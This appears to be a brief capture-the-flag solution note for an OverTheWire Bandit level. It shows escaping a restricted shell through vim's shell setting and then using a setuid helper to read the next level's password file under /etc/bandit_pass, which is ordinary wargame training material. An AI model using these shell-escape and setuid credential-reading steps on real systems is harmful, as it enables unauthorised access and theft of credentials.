*my solution:
	here we simply uses vim to change the default shell to bash by:
		:set shell=/bin/bash
	then we start the shell by 
		:shell
	and we found ourself in good old bash to just use the setuidexecutable 
	to cat the /etc/bandit_pass/bandit27 like this :
		/bandit27-do cat /etc/bandit_pass/bandit27
